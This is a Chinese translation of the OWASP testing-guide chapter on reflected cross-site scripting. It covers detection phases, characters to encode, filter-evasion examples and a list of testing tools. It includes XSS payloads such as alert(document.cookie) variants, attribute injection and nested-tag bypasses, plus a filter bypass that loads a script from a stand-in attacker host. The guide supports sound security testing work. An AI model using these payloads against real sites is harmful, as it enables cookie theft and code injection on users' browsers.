# 测试反射型跨站脚本

|ID          |
|------------|
|WSTG-INPV-01|

## 概述

当攻击者将浏览器可执行代码注入单个 HTTP 响应时，就会发生反射型[跨站脚本（XSS）](https://owasp.org/www-community/attacks/xss/)。注入的攻击不会存储在应用程序本身中；它是非持久性的，仅影响打开精心构造的链接或第三方网页的用户。攻击字符串作为构造的 URI 或 HTTP 参数的一部分，被应用程序不当处理，并返回给受害者。

反射型 XSS 是在野外最常见的 XSS 攻击类型。反射型 XSS 攻击也称为非持久性 XSS 攻击，由于攻击载荷通过单个请求和响应传递和执行，它们也被称为一阶或类型 1 XSS。

当 Web 应用程序存在此类漏洞时，它会将通过请求传递的未经验证的输入返回给客户端。攻击的常见手法包括一个设计步骤，攻击者创建并测试一个恶意的 URI，一个社会工程步骤，她诱使受害者在其浏览器上加载此 URI，以及最终使用受害者浏览器执行恶意代码。

通常，攻击者代码使用 JavaScript 语言编写，但也使用其他脚本语言，例如 ActionScript 和 VBScript。攻击者通常利用这些漏洞来安装键盘记录器、窃取受害者 cookie、执行剪贴板盗窃以及更改页面内容（例如下载链接）。

防止 XSS 漏洞的主要困难之一是适当的字符编码。在某些情况下，Web 服务器或 Web 应用程序可能无法过滤某些字符编码，因此，例如，Web 应用程序可能过滤掉 `<script>`，但可能不会过滤 `%3cscript%3e`，后者仅包含标签的另一种编码。

## 测试目标

- 识别响应中反射的变量。
- 评估它们接受的输入以及返回时应用的编码（如果有）。

## 如何测试

### 黑盒测试

黑盒测试至少包括三个阶段：

#### 检测输入向量

检测输入向量。对于每个网页，测试人员必须确定 Web 应用程序的所有用户定义变量以及如何输入它们。这包括隐藏或非明显的输入，如 HTTP 参数、POST 数据、隐藏表单字段值以及预定义的单选或选择值。通常使用浏览器内 HTML 编辑器或 Web 代理来查看这些隐藏变量。参见下面的示例。

#### 分析输入向量

分析每个输入向量以检测潜在漏洞。为了检测 XSS 漏洞，测试人员通常会对每个输入向量使用特制的输入数据。此类输入数据通常是无害的，但会触发来自 Web 浏览器的响应，从而显现漏洞。测试数据可以通过使用 Web 应用程序模糊测试器、自动化的已知攻击字符串列表或手动生成。
  一些此类输入数据的示例如下：

- `<script>alert(123)</script>`
- `"><script>alert(document.cookie)</script>`

有关潜在测试字符串的完整列表，请参见 [XSS 过滤规避速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)。

#### 检查影响

对于上一阶段尝试的每个测试输入，测试人员将分析结果并确定它是否代表对 Web 应用程序安全性具有实际影响的漏洞。这需要检查生成的网页 HTML 并搜索测试输入。一旦找到，测试人员会识别任何未正确编码、替换或过滤掉的特殊字符。易受攻击的未过滤特殊字符集取决于该部分 HTML 的上下文。

理想情况下，所有 HTML 特殊字符都将替换为 HTML 实体。要识别的关键 HTML 实体是：

- `>`（大于号）
- `<`（小于号）
- `&`（和号）
- `'`（撇号或单引号）
- `"`（双引号）

然而，HTML 和 XML 规范定义了完整的实体列表。[维基百科有完整的参考](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references)。

在 HTML 操作或 JavaScript 代码的上下文中，需要转义、编码、替换或过滤掉一组不同的特殊字符。这些字符包括：

- `\n`（换行符）
- `\r`（回车符）
- `'`（撇号或单引号）
- `"`（双引号）
- `\`（反斜杠）
- `\uXXXX`（Unicode 值）

更完整的参考，请参见 [Mozilla JavaScript 指南](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings)。

### 绕过 XSS 过滤器

反射型跨站脚本攻击通过 Web 应用程序清理输入、Web 应用防火墙阻止恶意输入或现代 Web 浏览器中嵌入的机制来防止。测试人员必须假设 Web 浏览器不会阻止攻击来测试漏洞。浏览器可能已过时，或内置安全功能被禁用。同样，Web 应用防火墙不能保证识别新颖、未知的攻击。攻击者可以构造一个 Web 应用防火墙无法识别的攻击字符串。

因此，大多数 XSS 防护必须依赖于 Web 应用程序对不受信任用户输入的清理。开发人员可以使用多种清理机制，例如返回错误、移除、编码或替换无效输入。应用程序检测和纠正无效输入的方式是防止 XSS 的另一个主要弱点。黑名单可能不包含所有可能的攻击字符串，白名单可能过于宽松，清理可能失败，或者某种输入类型可能被错误信任而未清理。所有这些都允许攻击者绕过 XSS 过滤器。

[XSS 过滤规避速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)记录了常见的过滤规避测试。

#### 示例 3：标签属性值

由于这些过滤器基于黑名单，它们可能无法阻止所有类型的表达式。事实上，有些情况下可以在不使用 `<script>` 标签甚至不使用通常被过滤的 `<` 和 `>` 等字符的情况下执行 XSS 利用。

例如，Web 应用程序可以使用用户输入值来填充属性，如下代码所示：

```html
<input type="text" name="state" value="INPUT_FROM_USER">
```

然后攻击者可以提交以下代码：

```text
" onfocus="alert(document.cookie)
```

#### 示例 4：不同的语法或编码

在某些情况下，基于签名的过滤器可以通过混淆攻击来轻松绕过。通常可以通过在语法或编码中插入意外的变体来实现。当代码返回时，浏览器将这些变体视为有效的 HTML，同时它们也可能被过滤器接受。

以下是一些示例：

- `"><script >alert(document.cookie)</script >`
- `"><ScRiPt>alert(document.cookie)</ScRiPt>`
- `"%3cscript%3ealert(document.cookie)%3c/script%3e`

#### 示例 5：绕过非递归过滤

有时清理仅应用一次，并且未递归执行。在这种情况下，攻击者可以通过发送包含多次尝试的字符串来击败过滤器，如下所示：

```text
<scr<script>ipt>alert(document.cookie)</script>
```

#### 示例 6：包含外部脚本

现在假设目标站点的开发人员实现了以下代码来保护输入免受外部脚本的包含：

```php
<?
    $re = "/<script[^>]+src/i";

    if (preg_match($re, $_GET['var']))
    {
        echo "Filtered";
        return;
    }
    echo "Welcome ".$_GET['var']." !";
?>
```

分解上述正则表达式：

1. 检查 `<script`
2. 检查一个 " "（空格）
3. 除 `>` 之外的任何字符，出现一次或多次
4. 检查 `src`

这对于过滤像 `<script src="https://attacker/xss.js"></script>` 这样的常见攻击很有用。但是，在这种情况下，可以通过在 script 和 src 之间的属性中使用 `>` 字符来绕过清理，如下所示：

```text
https://example/?var=<SCRIPT%20a=">"%20SRC="https://attacker/xss.js"></SCRIPT>
```

这将利用之前显示的反射型跨站脚本漏洞，执行存储在攻击者 Web 服务器上的 JavaScript 代码，就像它源自受害者站点 `https://example/` 一样。

#### 示例 7：HTTP 参数污染（HPP）

另一种绕过过滤器的方法是 HTTP 参数污染，该技术首先由 Stefano di Paola 和 Luca Carettoni 在 2009 年 OWASP 波兰会议上提出。更多信息请参见[测试 HTTP 参数污染](04-Testing_for_HTTP_Parameter_Pollution.md)。这种规避技术包括将攻击向量拆分到多个具有相同名称的参数中。每个参数值的操作取决于每种 Web 技术如何解析这些参数，因此这种规避并非总是可行的。如果被测环境连接所有具有相同名称的参数的值，则攻击者可以使用此技术绕过基于模式的安全机制。
常规攻击：

```text
https://example/page.php?param=<script>[...]</script>
```

使用 HPP 的攻击：

```text
https://example/page.php?param=<script&param=>[...]</&param=script>
```

有关更详细的过滤器规避技术列表，请参见 [XSS 过滤规避速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)。最后，分析响应可能很复杂。一种简单的方法是使用弹出对话框的代码，如我们的示例。这通常表明攻击者可以在访问者的浏览器中执行任意 JavaScript。

### 灰盒测试

灰盒测试类似于黑盒测试。在灰盒测试中，渗透测试人员对应用程序有部分了解。在这种情况下，渗透测试人员可能了解有关用户输入、输入验证控制以及用户输入如何呈现回给用户的信息。

如果源代码可用（白盒测试），则应分析所有从用户接收的变量。此外，测试人员应分析实施的任何清理过程，以决定是否可以被绕过。

## 工具

- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) 帮助您将任意文本编码到 65 种字符集之间，您可以在自定义载荷中使用这些字符集。
- [Hackvertor](https://hackvertor.co.uk/public) 是一个在线工具，允许对 JavaScript（或任何字符串输入）进行多种类型的编码和混淆。
- [XSS-Proxy](https://xss-proxy.sourceforge.net/) 是一个高级跨站脚本（XSS）攻击工具。
- [ratproxy](https://code.google.com/archive/p/ratproxy/) 是一个半自动化、主要是被动式的 Web 应用程序安全审计工具，针对准确和敏感检测以及自动注释潜在问题和安全相关设计模式进行了优化，基于对复杂 Web 2.0 环境中现有用户发起流量的观察。
- [Burp Proxy](https://portswigger.net/burp/) 是一个用于攻击和测试 Web 应用程序的交互式 HTTP/S 代理服务器。
- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) 是一个带有内置扫描器的交互式 HTTP/S 代理服务器，用于攻击和测试 Web 应用程序。
